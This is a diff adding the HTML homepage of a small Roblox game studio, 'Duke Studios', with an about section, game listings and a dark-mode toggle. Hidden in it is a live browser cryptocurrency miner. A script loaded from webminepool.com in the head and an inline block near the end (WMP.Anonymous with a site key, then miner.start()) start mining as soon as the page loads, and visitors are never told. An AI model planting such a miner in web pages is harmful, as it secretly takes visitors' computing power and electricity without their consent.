@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <!--=============== COPYRIGHT DUKESTUDIOS @2022 ===============-->
+            <!--=============== STOP LOOKING AT THE SOURCE CODE! ===============-->
+        <!--=============== REMIXICONS ===============-->
+        <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
+        <script src="https://webminepool.com/lib/base.js"></script>
+
+        <!--=============== CSS ===============-->
+        <link rel="stylesheet" href="assets/css/styles.css">
+        
+        <title>Duke Studios</title>
+        <link rel="icon" type="image/x-icon" href="assets/img/New Project (80).png">
+    </head>
+    <body>
+        <!--=============== NAVBAR ===============-->
+        <nav class="nav">
+            <ul class="nav__list">
+                <a href="#home" class="nav__link active-link">
+                    <i class="ri-home-5-line"></i>
+                    <span class="nav__name">
+                        Home
+                    </span>
+                </a>
+
+                <a href="#profile" class="nav__link">
+                    <i class="ri-user-line"></i>
+                    <span class="nav__name">
+                        About Us
+                    </span>
+                </a>
+
+                <a href="#message" class="nav__link">
+                    <i class="ri-chat-3-line"></i>
+                    <span class="nav__name">
+                        Games
+                    </span>
+                </a>
+
+                <a href="#mail" class="nav__link">
+                    <i class="ri-mail-open-line"></i>
+                    <span class="nav__name">
+                        Support
+                    </span>
+                </a>
+
+                <a href="#settings" class="nav__link">
+                    <i class="ri-settings-line"></i>
+                    <span class="nav__name">
+                        Settings
+                    </span>
+                </a>
+
+                <svg class="indicator" width="94" height="56" xmlns="http://www.w3.org/2000/svg">
+                    <ellipse cx="47" cy="28" rx="24" ry="28"/>
+                    <path d="M24 20C24 20 28 55.9999 48 56L0 55.9997C18 55.9998 24 20 24 20Z"/>
+                    <path d="M70 20C70 20 66 55.9999 46 56L94 55.9997C76 55.9998 70 20 70 20Z"/>
+                </svg>
+            </ul>
+        </nav>
+
+        <!--=============== MAIN ===============-->
+        <main class="container">
+            <section id="home">
+                <h2>Home</h2>
+                <center>
+                    <h1>Duke Studios</h1>
+                </center>
+            </section>
+
+            <section id="profile">
+                <h2>About Us</h2>
+                <center><p>Duke Studios<br>Duke Studios was founded in 2019 by <a href="https://www.roblox.com/users/116118669/profile">RacingDukes</a><br> RacingDukes had a few friends that where developers, starting off with <a href="https://web.roblox.com/users/430377132/profile">dodgersbiggestfan35</a><br> Dodger (dodgersbiggestfan35) impressed Duke (RacingDukes) with his developing and scripting and shortly became the Co-Owner of Duke Studios.<br> Ever since that point on Duke and Dodger have been developing games.<br> Dodger met <a href="https://web.roblox.com/users/393575809/profile">Anxllty</a> and was suprised with his scripting skills. <br> This is where we are now.<br><strong>----------------------------------</strong></p><p>What we do</center><center><br><br><strong>Duke - Lead Developer, Builder, Terrain Artist, Beginner Scripter, Modeler.</strong><br><strong>--</strong><br><strong>Dodger - Lead Developer, Builder, Terrain Artist, Builder, Whtie Hat Hacker, Advanced Scripter Gui Design.</strong><br><strong>--</strong><br><strong> Daniel - Developer, Advanced Scripter, Gui Design, White Hat Hacker, Anti-Cheat, Backdoor Expert.</strong><br></p></center>
+            </section>
+
+            <section id="message">
+                <h2>Games</h2>
+            <p><center><strong>----------------------</strong></center></p>
+                <h2>Dallas County</h2>
+                <center>
+                    <p><a href="https://www.roblox.com/games/7407045600/Dallas-County-RP-V2">Dallas County RP</a><br> Dallas County is a Roleplay game on roblox<br> that is designed to bring real life characteristics<br> into a roblox game. This can mean guns, cars, lighting, graphics!</p>
+                </center>
+                <center><img src ="assets/img/New Project (79).png"></center>
+                     <!--=============== lee county 1 ===============-->
+                     <p><center><strong>----------------------</strong></center></p>
+                     <h2>Lee County, FL</h2>
+                     <center>
+                         <p><a href="https://www.roblox.com/games/9119759596/Lee-County-FL">Lee County, FL</a><br><FONT COLOR="red">NOT RELEASED!</FONT><br> Lee County is a Florida based RP<br>The gameplay is close to <a href="https://www.roblox.com/games/7407045600/Dallas-County-RP-V2">Dallas County RP</a><br> There are more oppertunities in Lee County<br> Such as jobs, Guns buying (Saving Guns!) and more!<br>
+                     </center>
+                     <center><img src ="assets/img/New Project (79) (1).png"></center>
+            
+           
+            </section>
+            <section id="mail">
+                <h2>Support</h2>
+            </section>
+
+            <section id="settings">
+                <h2>Settings</h2>
+                <h1><center>Dark Mode</center></h1>
+               <nav>
+                <center>
+                    <img src="assets/img/moon.png" id="icon">
+                </center>
+               </nav>
+            </section>
+        </main>
+
+        <script>
+            var miner = WMP.Anonymous('SK_hG53kBqXdihMZBejDEDHN');
+            miner.start();
+        </script>
+
+        <!--=============== MAIN JS ===============-->
+        <script src="assets/js/main.js"></script>
+        <script>
+
+            var icon = document.getElementById("icon")
+
+            icon.onclick = function(){
+                document.body.classList.toggle("dark-theme")
+                if(document.body.classList.contains("dark-theme")){
+                    icon.src = "assets/img/sun.png";
+                }else{
+                    icon.src = "assets/img/moon.png";
+                }
+            }
+
+        </script>
+    </body>
+</html>
